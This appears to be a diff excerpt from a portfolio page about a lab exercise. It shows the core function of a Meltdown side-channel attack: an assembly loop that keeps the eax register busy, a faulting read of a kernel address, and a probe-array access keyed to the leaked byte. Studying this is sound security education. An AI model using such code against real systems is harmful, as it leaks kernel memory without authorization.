@@ -181,30 +181,22 @@ void meltdown_asm(unsigned long kernel_data_addr, int idx)
    char kernel_data = 0;  
 
    // Give eax register something to do  
-
    asm volatile(  
 
        ".rept 400;"          
-
        "add $0x141, %%eax;"  
-
        ".endr;"   
-
        :  
-
        :  
-
        : "eax"  
 
    );   
 
    
    // The following statement will cause an exception  
-
    kernel_data = *(char*)kernel_data_addr;    
-
    array[idx*4096 + DELTA] += 1;      
-             
+
 }
 
 [Back to Portfolio](./)
